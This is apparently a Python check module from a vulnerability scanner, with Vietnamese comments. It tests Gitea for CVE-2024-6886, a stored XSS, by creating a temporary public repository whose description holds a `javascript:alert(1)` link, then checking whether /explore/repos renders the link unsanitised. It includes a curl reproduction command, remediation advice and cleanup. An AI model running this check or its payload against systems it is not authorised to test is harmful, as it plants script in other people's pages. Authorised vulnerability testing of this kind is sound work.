"""CVE-2024-6886 — Stored XSS qua trường Repository Description.

Root cause (xem report/Report_VULN-03_CVE-2024-6886.md): bluemonday policy
riêng cho Description (`createRepoDescriptionPolicy()`, modules/markup/
sanitizer.go) cho phép attribute `href` trên thẻ `<a>` nhưng không gọi
`AllowStandardURLs()` để giới hạn scheme — khác với policy mặc định dùng cho
markdown thường. Kết quả: `href="javascript:..."` không bị lọc. Gitea < 1.22.1.

Analyze flow (cần auth — chỉ cần 1 account bất kỳ để tạo repo):
1. Tạo 1 repo PUBLIC ephemeral, Description = payload PoC gốc
   (`<a href="javascript:alert(1)">check</a>`).
2. GET /explore/repos (không cần đăng nhập — đúng vector thật: nạn nhân xem
   trang public, không cần login).
3. Tìm đúng card của repo vừa tạo (khớp href `/{owner}/{repo}`), kiểm tra
   description render ra có còn `<a href="javascript:alert(1)">` nguyên vẹn
   hay không (bị bluemonday chặn/escape thì coi là not_vulnerable).
4. Dọn dẹp: xoá repo ephemeral dù kết quả thế nào.

Payload dùng đúng 1 giá trị đã verify trong report gốc, không thử biến thể
payload khác (không dùng <img>/<svg>/DOM clobbering...).
"""
import uuid

from bs4 import BeautifulSoup

from checks.registry import CheckContext
from core.models import CheckResult, Status

CVE_ID = "CVE-2024-6886"
REF_ID = "VULN-03"
RISK_LEVEL = "Medium"
WSTG_REF = "WSTG-INPV-02 — Testing for Stored Cross Site Scripting"
CWE = "CWE-79 — Improper Neutralization of Input During Web Page Generation"
REMEDIATION = (
    "Nâng cấp Gitea lên >= 1.22.1 (PR #31192/#31200 thêm policy.AllowStandardURLs() "
    "cho createRepoDescriptionPolicy(), chặn scheme javascript:/vbscript:/data: "
    "trong href của Description). Nếu chưa upgrade được ngay: tạm thời escape "
    "toàn bộ Description thay vì render HTML."
)
REFERENCES = [
    "CVE-2024-6886",
    "GHSA-4h4p-553m-46qh",
    "Gitea PR #31192, #31200 (fix)",
    "Exploit-DB #52077",
    "CWE-79: https://cwe.mitre.org/data/definitions/79.html",
]

_PAYLOAD_DESCRIPTION = '<a href="javascript:alert(1)">check</a>'


def _result(status: Status, evidence: str, detail: str, request_repro: str = "", response_summary: str = "") -> CheckResult:
    return CheckResult(
        cve_id=CVE_ID,
        ref_id=REF_ID,
        risk_level=RISK_LEVEL,
        wstg_ref=WSTG_REF,
        cwe=CWE,
        status=status,
        evidence=evidence,
        detail=detail,
        request_repro=request_repro,
        response_summary=response_summary,
        remediation=REMEDIATION,
        references=REFERENCES,
    )


def analyze(ctx: CheckContext) -> CheckResult:
    session = ctx.session
    owner = ctx.args.username
    repo_name = f"nday-xss-{uuid.uuid4().hex[:10]}"

    repo_created = False
    try:
        create_resp = session.api_json(
            "POST",
            "/api/v1/user/repos",
            {"name": repo_name, "private": False, "auto_init": True, "description": _PAYLOAD_DESCRIPTION},
        )
        request_repro = (
            f'curl -u "<username>:<password>" -X POST "{ctx.base_url}/api/v1/user/repos" \\\n'
            "  -H \"Content-Type: application/json\" \\\n"
            f"  -d '{{\"name\":\"{repo_name}\",\"private\":false,\"auto_init\":true,"
            f"\"description\":\"{_PAYLOAD_DESCRIPTION}\"}}'\n"
            f"curl \"{ctx.base_url}/explore/repos\""
        )
        if create_resp.status_code != 201:
            return _result(
                Status.INCONCLUSIVE,
                evidence=create_resp.text[:500],
                detail=f"Không tạo được ephemeral repo (HTTP {create_resp.status_code}).",
                request_repro=request_repro,
            )
        repo_created = True

        explore_resp = session.get("/explore/repos")
        explore_resp.raise_for_status()
        response_summary = f"HTTP {explore_resp.status_code}, độ dài response: {len(explore_resp.text)} bytes"

        soup = BeautifulSoup(explore_resp.text, "html.parser")
        repo_path = f"/{owner}/{repo_name}"
        card_link = next(
            (a for a in soup.find_all("a", class_="name") if a.get("href") == repo_path),
            None,
        )
        if card_link is None:
            return _result(
                Status.INCONCLUSIVE,
                evidence=response_summary,
                detail=(
                    f"Không tìm thấy repo '{owner}/{repo_name}' trên /explore/repos — có thể "
                    "trang bị phân trang/sort khác, hoặc cấu trúc HTML đã đổi so với logic parse hiện tại."
                ),
                request_repro=request_repro,
                response_summary=response_summary,
            )

        # Layout trang /explore/repos đổi giữa các bản Gitea trong scope:
        # - Gitea 1.22.x (mới): <div class="flex-item">...<div class="flex-item-body">DESC</div>
        # - Gitea 1.16.8 (cũ):  <div class="item">...<div class="description">DESC</div>
        # Thử lần lượt cả 2 cấu trúc — không tìm thấy container nào thì phải
        # trả INCONCLUSIVE (không rõ do đã patch hay do parse sai), KHÔNG được
        # mặc định NOT_VULNERABLE (tránh false negative).
        card = card_link.find_parent(class_="flex-item") or card_link.find_parent(class_="item")
        desc_container = None
        if card is not None:
            desc_container = card.find(class_="flex-item-body") or card.find(class_="description")

        if desc_container is None:
            return _result(
                Status.INCONCLUSIVE,
                evidence=response_summary,
                detail=(
                    f"Tìm thấy repo '{owner}/{repo_name}' trên /explore/repos nhưng không xác định "
                    "được vùng chứa description (cấu trúc HTML card khác với 2 layout đã hỗ trợ) — "
                    "cần cập nhật logic parse trong cve_2024_6886.py, KHÔNG kết luận not_vulnerable."
                ),
                request_repro=request_repro,
                response_summary=response_summary,
            )

        desc_html = desc_container.decode_contents().strip()
        payload_link = desc_container.find("a", href="javascript:alert(1)")

        evidence = f"Description render trên /explore/repos cho repo '{owner}/{repo_name}':\n{desc_html}"

        if payload_link is not None:
            detail = (
                "Description chứa payload gốc "
                f"'{_PAYLOAD_DESCRIPTION}' render nguyên vẹn (thẻ <a href=\"javascript:alert(1)\"> "
                "không bị lọc/escape) — xác nhận Stored XSS."
            )
            return _result(Status.VULNERABLE, evidence=evidence, detail=detail, request_repro=request_repro, response_summary=response_summary)

        detail = (
            "Description không còn render thẻ <a href=\"javascript:alert(1)\"> nguyên vẹn — "
            "có vẻ đã bị sanitizer chặn/escape (bản đã patch)."
        )
        return _result(Status.NOT_VULNERABLE, evidence=evidence, detail=detail, request_repro=request_repro, response_summary=response_summary)

    finally:
        if repo_created:
            session.api_json("DELETE", f"/api/v1/repos/{owner}/{repo_name}")
